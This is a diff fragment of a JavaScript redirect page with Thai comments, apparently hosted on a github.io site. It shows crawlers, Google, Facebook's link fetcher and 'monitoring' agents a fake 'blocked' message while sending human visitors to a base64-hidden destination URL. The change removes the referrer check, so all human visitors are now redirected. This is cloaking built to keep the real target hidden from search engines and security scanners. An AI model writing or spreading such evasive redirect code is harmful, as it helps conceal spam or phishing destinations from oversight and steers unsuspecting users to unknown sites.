@@ -24,23 +24,18 @@
     const ua = navigator.userAgent.toLowerCase();
     const isBot = /bot|crawl|spider|slurp|mediapartners|google|facebookexternalhit|fetch|monitoring/i.test(ua);
 
-    // ตรวจ referrer (ต้องมาจากโดเมนของคุณ)
-    const expectedReferrer = "freehub99.github.io";
-    const actualRef = document.referrer.toLowerCase();
-
     function shouldRedirect() {
       if (isBot) return false;
-      if (!actualRef.includes(expectedReferrer)) return false;
-      return true;
+      return true; // ไม่เช็ค referrer แล้ว
     }
 
     // เริ่มการเปลี่ยนเส้นทาง
     function go() {
       if (shouldRedirect()) {
         const finalUrl = atob(encodedUrl);
-        window.location.href = finalUrl; // ไม่มีหน่วงเวลา
+        window.location.href = finalUrl;
       } else {
-        document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>คุณอาจเข้าผิดลิงก์ หรือระบบป้องกันบล็อกไว้</p>";
+        document.body.innerHTML = "<h1>ไม่สามารถเปลี่ยนเส้นทางได้</h1><p>ระบบป้องกันบล็อกไว้</p>";
       }
     }
 
